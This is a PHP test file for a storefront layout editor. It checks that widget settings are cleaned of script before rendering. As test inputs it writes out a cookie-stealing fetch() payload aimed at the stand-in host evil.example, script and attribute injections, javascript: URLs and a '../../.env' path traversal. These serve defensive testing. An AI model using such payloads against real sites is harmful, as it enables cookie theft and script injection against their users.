<?php

namespace Tests\Feature\AdminV2;

use App\Models\Brand;
use App\Models\LayoutPlacement;
use App\Models\LayoutTemplate;
use App\Models\Permission;
use App\Models\Role;
use App\Models\User;
use App\Services\LayoutSaver;
use App\Support\WidgetConfig;
use App\Support\Widgets;
use Database\Seeders\RolePermissionSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

/**
 * A placement's settings keep only what its widget declares, in the shape
 * each field type allows, whether they arrive from the layout editor, a
 * template, a copy or a theme's own files. Settings print into attributes
 * and Alpine expressions, so a number that is really script must never
 * reach a view.
 */
class WidgetConfigCleaningTest extends TestCase
{
    use RefreshDatabase;

    private const PAYLOAD = '0,x:fetch(/\/evil.example\/c/.source+document.cookie)';

    protected function tearDown(): void
    {
        Widgets::forget('test.shapes');
        parent::tearDown();
    }

    private function rows(string $widget, array $config): array
    {
        return [['id' => null, 'region' => 'content_top', 'columns' => [8], 'enabled' => true, 'placements' => [
            ['id' => null, 'widget' => $widget, 'column' => 0, 'title' => 'Our brands', 'enabled' => true, 'config' => $config],
        ]]];
    }

    private function layoutEditor(): User
    {
        $this->seed(RolePermissionSeeder::class);
        $user = User::factory()->role('designer')->create();
        $ids = collect(['layout.view', 'layout.edit'])->map(fn ($slug) => Permission::firstOrCreate(['slug' => $slug], ['name' => $slug, 'group' => 'layout'])->id);
        Role::where('slug', 'designer')->firstOrFail()->permissions()->syncWithoutDetaching($ids->all());

        return $user->fresh();
    }

    public function test_a_script_in_a_number_setting_never_reaches_the_page(): void
    {
        Brand::create(['store_id' => 1, 'name' => 'Demo Brand', 'slug' => 'demo-brand', 'image' => 'brands/demo.png', 'is_active' => true]);

        app(LayoutSaver::class)->save('home', ['rows' => $this->rows('catalog.brands', [
            'speed' => self::PAYLOAD,
            'autoplay' => '1',
            'evil' => '<script>alert(1)</script>',
        ])]);

        $config = LayoutPlacement::where('widget', 'catalog.brands')->firstOrFail()->config;

        $this->assertSame(['autoplay' => '1'], $config);
        $this->get('/')->assertOk()->assertSee('brandCarousel({ autoplay: true, speed: 3000 })', false)
            ->assertDontSee('evil.example', false)->assertDontSee('fetch(', false);
    }

    public function test_numbers_are_clamped_and_choices_come_from_their_list(): void
    {
        app(LayoutSaver::class)->save('home', ['rows' => array_merge(
            $this->rows('catalog.brands', ['speed' => '999999', 'autoplay' => "1'};alert(1);//"]),
            $this->rows('catalog.products', ['limit' => '8', 'columns' => '4', 'layout' => 'grid" x-init="alert(1)', 'category' => '12']),
        )]);

        $brands = LayoutPlacement::where('widget', 'catalog.brands')->firstOrFail()->config;
        $products = LayoutPlacement::where('widget', 'catalog.products')->firstOrFail()->config;

        $this->assertSame(['speed' => 30000], $brands);
        $this->assertSame(8, $products['limit']);
        $this->assertSame('4', $products['columns']);
        $this->assertArrayNotHasKey('layout', $products);
        // Its options are the store's categories, looked up when the editor
        // opens: a short plain value is kept for the resolver to look up.
        $this->assertSame('12', $products['category']);
    }

    public function test_a_template_or_theme_file_is_cleaned_the_same_way(): void
    {
        $rows = LayoutTemplate::cleanRows([[
            'columns' => [8],
            'placements' => [
                ['widget' => 'content.cta', 'config' => ['text' => "Line one\nLine two", 'url' => "java\tscript:alert(1)", 'button' => 'Go', 'onload' => 'x']],
                ['widget' => 'content.icon_list', 'config' => ['items' => [
                    ['icon' => 'truck', 'title' => 'Fast', 'text' => 'Ships today', 'extra' => 'dropped'],
                    ['icon' => '"><svg onload=alert(1)>', 'title' => 'Bad icon'],
                    'not a row',
                ]]],
                ['widget' => 'content.banner', 'config' => ['image' => '../../.env', 'url' => '/sale', 'heading' => 'Sale']],
                ['widget' => 'nothing.registers.this', 'config' => ['x' => 1]],
            ],
        ]]);

        $placements = $rows[0]['placements'];
        $this->assertCount(3, $placements);

        $this->assertSame(['text' => "Line one\nLine two", 'button' => 'Go', 'url' => ''], $placements[0]['config']);

        $items = $placements[1]['config']['items'];
        $this->assertCount(2, $items);
        $this->assertSame(['icon' => 'truck', 'title' => 'Fast', 'text' => 'Ships today'], $items[0]);
        $this->assertSame(['title' => 'Bad icon'], $items[1]);

        $this->assertSame(['image' => '', 'heading' => 'Sale', 'url' => '/sale'], $placements[2]['config']);
    }

    public function test_field_types_a_theme_adds_are_kept_in_their_shapes(): void
    {
        Widgets::register('test.shapes', [
            'schema' => [
                'on' => ['type' => 'toggle'],
                'tint' => ['type' => 'color'],
                'brand_tint' => ['type' => 'color'],
                'link' => ['type' => 'url'],
                'photo' => ['type' => 'media'],
                'scheme' => ['type' => 'scheme'],
                'html' => ['type' => 'textarea', 'code' => true],
            ],
        ]);

        $clean = WidgetConfig::clean('test.shapes', [
            'on' => 'yes',
            'tint' => 'red;background:url(//evil.example)',
            'brand_tint' => 'primary',
            'link' => 'javascript:alert(1)',
            'photo' => 'https://example.com/a.jpg',
            'scheme' => ['dark' => true, 'shade' => 3, 'bad key!' => 'x', 'deep' => [[[[['too deep']]]]]],
            'html' => '<b>As written</b>',
        ]);

        $this->assertTrue($clean['on']);
        $this->assertArrayNotHasKey('tint', $clean);
        $this->assertSame('primary', $clean['brand_tint']);
        $this->assertSame('', $clean['link']);
        $this->assertSame('https://example.com/a.jpg', $clean['photo']);
        $this->assertSame(['dark' => true, 'shade' => 3, 'deep' => [[[]]]], $clean['scheme']);
        $this->assertSame('<b>As written</b>', $clean['html']);

        $this->assertSame([], WidgetConfig::clean('nothing.registers.this', ['x' => 1]));
    }

    public function test_copying_an_html_block_needs_storefront_code(): void
    {
        $rows = $this->rows('content.html', ['html' => '<script>alert(1)</script>']);

        $this->actingAs($this->layoutEditor());
        $this->postJson(route('admin.layout.copy'), ['region' => 'content_top', 'target_page' => 'cart', 'rows' => $rows])->assertForbidden();
        $this->assertSame(0, LayoutPlacement::where('widget', 'content.html')->count());

        // Other blocks copy as before.
        $this->postJson(route('admin.layout.copy'), ['region' => 'content_top', 'target_page' => 'cart', 'rows' => $this->rows('content.cta', ['text' => 'Hi'])])->assertOk();

        $this->actingAs(User::factory()->create());
        $this->postJson(route('admin.layout.copy'), ['region' => 'content_top', 'target_page' => 'cart', 'rows' => $rows])->assertOk();
        $this->assertSame(1, LayoutPlacement::where('widget', 'content.html')->count());
    }
}
